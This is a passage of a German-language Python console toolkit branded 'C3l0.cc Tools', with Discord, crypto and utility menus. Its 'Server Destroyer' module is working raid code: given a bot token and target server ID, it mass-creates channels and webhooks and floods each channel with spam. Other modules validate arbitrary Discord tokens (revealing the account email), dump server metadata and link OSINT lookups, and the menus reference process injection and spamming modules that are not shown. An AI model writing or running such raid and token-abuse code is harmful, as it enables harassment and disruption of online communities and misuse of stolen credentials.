    table.add_column("Eigenschaft", style=current_theme['primary'])
    table.add_column("Wert", style="white")

    with console.status(f"[{current_theme['secondary']}]Validiere Token über Discord API...[/{current_theme['secondary']}]", spinner="dots"):
        try:
            req = urllib.request.Request("https://discord.com/api/v10/users/@me", headers=headers)
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                table.add_row("Status", "[bold green]GÜLTIG / ONLINE[/bold green]")
                table.add_row("Username", f"{data.get('username')}#{data.get('discriminator', '0')}")
                table.add_row("User ID", str(data.get("id")))
                table.add_row("E-Mail", data.get("email", "Nicht verfügbar / Bot"))
                table.add_row("Verifiziert", str(data.get("verified", "N/A")))
        except urllib.error.HTTPError as e:
            table.add_row("Status", f"[bold red]UNGÜLTIG (HTTP {e.code})[/bold red]")
        except Exception as e:
            table.add_row("Status", f"[bold red]Fehler: {e}[/bold red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_server_dumper():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Discord Server Info Dumper[/{current_theme['primary']}]", border_style="dim white", width=65)))
    token = Prompt.ask(f"[{current_theme['primary']}]Bot Token eingeben[/{current_theme['primary']}]")
    guild_id = int(Prompt.ask(f"[{current_theme['primary']}]Ziel Server ID (Guild ID) eingeben[/{current_theme['primary']}]"))
    
    dump_data = {}
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        nonlocal dump_data
        try:
            guild = client.get_guild(guild_id)
            if not guild:
                guild = await client.fetch_guild(guild_id)
            
            dump_data = {
                "server_name": guild.name,
                "server_id": guild.id,
                "owner_id": guild.owner_id,
                "member_count": guild.member_count,
                "channels": [{"id": c.id, "name": c.name, "type": str(c.type)} for c in guild.channels],
                "roles": [{"id": r.id, "name": r.name, "color": str(r.color)} for r in guild.roles]
            }
        except Exception:
            pass
        await client.close()

    with console.status(f"[{current_theme['secondary']}]Dumping Server Metadaten...[/{current_theme['secondary']}]", spinner="dots"):
        try:
            client.run(token.strip())
        except Exception:
            pass

    if dump_data:
        filename = f"server_dump_{guild_id}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(dump_data, f, indent=4, ensure_ascii=False)
        console.print(Align.center(f"\n[bold green]Daten erfolgreich in '{filename}' gespeichert.[/bold green]"))
    else:
        console.print(Align.center("\n[bold red]Fehler beim Dumpen der Server-Daten.[/bold red]"))
    
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_snowflake_inspector():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Discord User ID Inspector & OSINT Finder[/{current_theme['primary']}]", border_style="dim white", width=65)))
    user_id_str = Prompt.ask(f"[{current_theme['primary']}]Discord User ID (Snowflake) eingeben[/{current_theme['primary']}]")
    bot_token = Prompt.ask(f"[{current_theme['primary']}]Bot-Token für API-Lookup eingeben (optional, Enter zum Überspringen)[/]", default="")
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Eigenschaft", style=current_theme['primary'])
    table.add_column("Wert", style="white")

    try:
        uid = int(user_id_str)
        timestamp_ms = (uid >> 22) + 1420070400000
        creation_date = datetime.datetime.fromtimestamp(timestamp_ms / 1000.0, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
        
        # Snowflake Daten
        table.add_row("User ID", str(uid))
        table.add_row("Erstellungszeitpunkt", creation_date)
        table.add_row("Internal Worker ID", str((uid & 0x3E0000) >> 17))
        table.add_row("Internal Process ID", str((uid & 0x1F000) >> 12))
        table.add_row("Increment", str(uid & 0xFFF))
        
        # API / OSINT Lookup falls Bot Token angegeben oder öffentlicher Endpoint erreichbar
        api_success = False
        if bot_token.strip():
            with console.status(f"[{current_theme['secondary']}]Frage Discord API ab...[/{current_theme['secondary']}]", spinner="dots"):
                try:
                    req = urllib.request.Request(
                        f"https://discord.com/api/v10/users/{uid}",
                        headers={"Authorization": f"Bot {bot_token.strip()}", "User-Agent": "Mozilla/5.0"}
                    )
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        udata = json.loads(resp.read().decode())
                        table.add_row("--- API LOOKUP ---", "--- ERGEBNISSE ---")
                        table.add_row("Username", udata.get("username", "N/A"))
                        table.add_row("Global Name", udata.get("global_name", "N/A"))
                        table.add_row("Bot Account", str(udata.get("bot", False)))
                        table.add_row("Avatar Hash", udata.get("avatar", "N/A"))
                        api_success = True
                except Exception as e:
                    table.add_row("API Hinweis", f"[yellow]Konnte API nicht abfragen: {e}[/yellow]")
        
        if not api_success:
            # Fallback: Öffentliche OSINT / Lookup Verknüpfungs-Links generieren
            table.add_row("--- VERKNÜPFUNGEN / OSINT ---", "--- LINKS ---")
            table.add_row("Discord Lookup Web", f"https://discord.id/?p={uid}")
            table.add_row("Clyde / Profile Link", f"https://discord.com/users/{uid}")

    except Exception as e:
        table.add_row("Fehler", f"[red]Ungültige ID: {e}[/red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_server_destroyer():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Discord Server Destroyer[/{current_theme['primary']}]", border_style="dim white", width=65)))
    token = Prompt.ask(f"[{current_theme['primary']}]Bot Token eingeben[/{current_theme['primary']}]")
    guild_id = int(Prompt.ask(f"[{current_theme['primary']}]Ziel Server ID (Guild ID) eingeben[/{current_theme['primary']}]"))
    channel_prefix = Prompt.ask(f"[{current_theme['primary']}]Kanal-Namen Präfix[/{current_theme['primary']}]", default="c3l0-raid")
    message = Prompt.ask(f"[{current_theme['primary']}]Nachricht für die Kanäle[/{current_theme['primary']}]")
    try:
        count = int(Prompt.ask(f"[{current_theme['primary']}]Anzahl der Kanäle[/{current_theme['primary']}]", default="20"))
    except:
        count = 20
    
    table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
    table.add_column("Aktion", style=current_theme['primary'])
    table.add_column("Details", style="white")
    table.add_column("Status", style=current_theme['primary'], justify="center")

    created_channels = 0
    created_webhooks = 0
    sent_messages = 0
    bot_name = "Unbekannt"
    status_auth = "FEHLER"

    intents = discord.Intents.default()
    intents.guilds = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        nonlocal created_channels, created_webhooks, sent_messages, bot_name, status_auth
        bot_name = client.user.name
        status_auth = "ONLINE"
        try:
            guild = client.get_guild(guild_id)
            if not guild:
                guild = await client.fetch_guild(guild_id)
            
            async def attack_channel(i):
                nonlocal created_channels, created_webhooks, sent_messages
                try:
                    channel = await guild.create_text_channel(f"{channel_prefix}-{i}")
                    created_channels += 1
                    
                    webhook_tasks = [channel.create_webhook(name=f"c3l0-{i}-{w}") for w in range(5)]
                    webhooks = await asyncio.gather(*webhook_tasks, return_exceptions=True)
                    valid_webhooks = [w for w in webhooks if not isinstance(w, Exception)]
                    created_webhooks += len(valid_webhooks)
                    
                    if message and valid_webhooks:
                        tasks = []
                        for _ in range(100):
                            wh = secrets.choice(valid_webhooks)
                            tasks.append(wh.send(message))
                        
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        sent_messages += sum(1 for r in results if not isinstance(r, Exception))
                except Exception:
                    pass

            await asyncio.gather(*(attack_channel(i) for i in range(1, count + 1)))
        except Exception:
            pass
        await client.close()

    with console.status(f"[{current_theme['secondary']}]Verbinde Bot & starte Multi-Webhook High-Speed Flood...[/{current_theme['secondary']}]", spinner="dots"):
        try:
            client.run(token.strip())
        except Exception:
            pass

    auth_style = "bold green" if status_auth == "ONLINE" else "bold red"
    table.add_row("Bot Gateway", f"Online als {bot_name}", f"[{auth_style}]{status_auth}[/{auth_style}]")
    
    chan_status_style = "bold green" if created_channels > 0 else "bold red"
    table.add_row("Kanäle & Webhooks", f"{created_channels}/{count} Kanäle | {created_webhooks} Webhooks", f"[{chan_status_style}]{'ERFOLGREICH' if created_channels > 0 else 'FEHLER'}[/{chan_status_style}]")
    table.add_row("Nachrichten Spam", f"{sent_messages} gesendet", "[bold green]ERFOLGREICH[/bold green]" if sent_messages > 0 else "[dim]Keine[/dim]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_codec_converter():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Base64 & Hex Codec Tool[/{current_theme['primary']}]", border_style="dim white", width=65)))
    mode = Prompt.ask(f"[{current_theme['primary']}]Modus wählen ([1] Enkodieren | [2] Dekodieren)[/{current_theme['primary']}]", choices=["1", "2"])
    text = Prompt.ask(f"[{current_theme['primary']}]Text / Payload eingeben[/{current_theme['primary']}]")
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Format", style=current_theme['primary'])
    table.add_column("Ergebnis", style="white")

    try:
        if mode == "1":
            b64_res = base64.b64encode(text.encode("utf-8")).decode("utf-8")
            hex_res = text.encode("utf-8").hex()
            table.add_row("Base64", b64_res)
            table.add_row("Hexadezimal", hex_res)
        else:
            b64_dec = base64.b64decode(text.encode("utf-8")).decode("utf-8", errors="ignore")
            hex_dec = bytes.fromhex(text).decode("utf-8", errors="ignore")
            table.add_row("Base64 dekodiert", b64_dec)
            table.add_row("Hex dekodiert", hex_dec)
    except Exception as e:
        table.add_row("Fehler", f"[red]{e}[/red]")

    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Menü zurückzukehren[/{current_theme['secondary']}]")

def module_snippet_manager():
    snippets_file = "c3l0_snippets.json"
    
    def load_snippets():
        if os.path.exists(snippets_file):
            try:
                with open(snippets_file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def save_snippets(data):
        with open(snippets_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)

    while True:
        clear_screen()
        console.print(Align.center(Panel(f"[{current_theme['primary']}]Quick Snippet / Payload Manager[/{current_theme['primary']}]", border_style="dim white", width=65)))
        
        snippets = load_snippets()
        table = Table(show_header=True, header_style=current_theme['primary'], border_style="dim white", width=65)
        table.add_column("Titel", style=current_theme['primary'])
        table.add_column("Vorschau", style="dim white")

        for title, content in snippets.items():
            table.add_row(title, content[:30] + ("..." if len(content) > 30 else ""))

        if not snippets:
            table.add_row("Keine Snippets", "Speichere welche über [1]")

        console.print(Align.center(table))
        console.print(Align.center(f"\n[{current_theme['primary']}][1] Snippet hinzufügen  |  [2] Snippet anzeigen  |  [0] Zurück[/{current_theme['primary']}]"))
        
        choice = Prompt.ask(f"[{current_theme['primary']}]Wahl[/{current_theme['primary']}]", choices=["1", "2", "0"], default="0")
        if choice == "1":
            title = Prompt.ask(f"[{current_theme['primary']}]Titel[/{current_theme['primary']}]")
            content = Prompt.ask(f"[{current_theme['primary']}]Inhalt / Payload[/{current_theme['primary']}]")
            snippets[title] = content
            save_snippets(snippets)
        elif choice == "2":
            title = Prompt.ask(f"[{current_theme['primary']}]Titel des Snippets[/{current_theme['primary']}]")
            if title in snippets:
                console.print(Panel(snippets[title], title=title, border_style="dim white"))
                Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um fortzufahren[/{current_theme['secondary']}]")
        elif choice == "0":
            break

def render_screensaver_frame(tick):
    width = console.size.width
    height = console.size.height - 1

    ascii_banner = pyfiglet.figlet_format("C3l0.cc Tools", font="slant").splitlines()
    banner_height = len(ascii_banner)
    banner_width = max(len(line) for line in ascii_banner)

    box_height = banner_height
    start_y = max(0, (height - box_height) // 2)
    banner_start_x = max(0, (width - banner_width) // 2)

    frame = Text()

    for y in range(height):
        line = Text()
        if start_y <= y < start_y + banner_height:
            b_line = ascii_banner[y - start_y].ljust(banner_width)
            left_bg = build_bg_segment(0, banner_start_x, y, tick)
            right_start = banner_start_x + banner_width
            right_len = max(0, width - right_start)
            right_bg = build_bg_segment(right_start, right_len, y, tick)
            
            line.append(left_bg, style="grey27")
            line.append(b_line, style=current_theme['primary'])
            line.append(right_bg, style="grey27")
        else:
            bg_line = build_bg_segment(0, width, y, tick)
            line.append(bg_line, style="grey27")

        frame.append(line)
        if y < height - 1:
            frame.append("\n")

    return frame

def module_screensaver():
    clear_screen()
    tick = 0
    with Live(render_screensaver_frame(tick), console=console, refresh_per_second=30, screen=True) as live:
        while True:
            if msvcrt.kbhit():
                msvcrt.getch()
                break
            tick += 1
            live.update(render_screensaver_frame(tick))
            time.sleep(0.03)

def module_hash_generator():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Cryptographic Hash Generator[/{current_theme['primary']}]", border_style="dim white", width=65)))
    text = Prompt.ask(f"[{current_theme['primary']}]Text eingeben[/{current_theme['primary']}]")
    
    md5_val = hashlib.md5(text.encode()).hexdigest()
    sha256_val = hashlib.sha256(text.encode()).hexdigest()
    sha512_val = hashlib.sha512(text.encode()).hexdigest()
    
    table = Table(show_header=False, border_style="dim white", width=65)
    table.add_column("Algorithmus", style=current_theme['primary'])
    table.add_column("Hash", style="white")
    
    table.add_row("MD5", md5_val)
    table.add_row("SHA-256", sha256_val)
    table.add_row("SHA-512", sha512_val)
    
    console.print(Align.center(table))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def module_pass_generator():
    clear_screen()
    console.print(Align.center(Panel(f"[{current_theme['primary']}]Secure Key Generator[/{current_theme['primary']}]", border_style="dim white", width=65)))
    
    alphabet = string.ascii_letters + string.digits + "!@#$%&*"
    password = ''.join(secrets.choice(alphabet) for _ in range(24))
    
    console.print(Align.center(Panel(f"[bold white]{password}[/bold white]", title="Generierter Schlüssel", border_style="dim white", width=65)))
    Prompt.ask(f"\n[{current_theme['secondary']}]Drücke Enter um zum Hauptmenü zurückzukehren[/{current_theme['secondary']}]")

def network_tools_menu():
    while True:
        choice = interactive_network_menu()
        if choice in ["01", "1"]:
            module_ip_lookup()
        elif choice in ["02", "2"]:
            module_port_scanner()
        elif choice in ["03", "3"]:
            module_dns_lookup()
        elif choice in ["04", "4"]:
            module_http_builder()
        elif choice in ["05", "5"]:
            module_tcp_listener()
        elif choice in ["00", "0"]:
            break

def system_tools_menu():
    while True:
        choice = interactive_system_menu()
        if choice in ["01", "1"]:
            module_system_info()
        elif choice in ["02", "2"]:
            module_file_integrity()
        elif choice in ["03", "3"]:
            module_process_manager()
        elif choice in ["04", "4"]:
            module_process_injection()
        elif choice in ["00", "0"]:
            break

def discord_tools_menu():
    while True:
        choice = interactive_discord_menu()
        if choice in ["01", "1"]:
            module_webhook_sender()
        elif choice in ["02", "2"]:
            module_standalone_spammer()
        elif choice in ["03", "3"]:
            module_server_destroyer()
        elif choice in ["04", "4"]:
            module_token_validator()
        elif choice in ["05", "5"]:
            module_server_dumper()
        elif choice in ["06", "6"]:
            module_snowflake_inspector()
        elif choice in ["00", "0"]:
            break

def crypto_tools_menu():
    while True:
        choice = interactive_crypto_menu()
        if choice in ["01", "1"]:
            module_hash_generator()
        elif choice in ["02", "2"]:
            module_pass_generator()
        elif choice in ["03", "3"]:
            module_codec_converter()
        elif choice in ["00", "0"]:
            break

def main():
    hide_cursor()
    try:
        boot_sequence()
        while True:
            choice = interactive_menu()

            if choice in ["01", "1"]:
                network_tools_menu()
            elif choice in ["02", "2"]:
                system_tools_menu()
            elif choice in ["03", "3"]:
                discord_tools_menu()
            elif choice in ["04", "4"]:
                crypto_tools_menu()
            elif choice in ["05", "5"]:
                module_snippet_manager()
            elif choice in ["06", "6"]:
                module_screensaver()
            elif choice in ["07", "7"]:
                module_settings()
            elif choice in ["00", "0"]:
                clear_screen()
                console.print(f"[{current_theme['secondary']}]Session beendet.[/{current_theme['secondary']}]")
                show_cursor()
                sys.exit(0)
    finally:
        show_cursor()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear_screen()
        show_cursor()
        sys.exit(0)
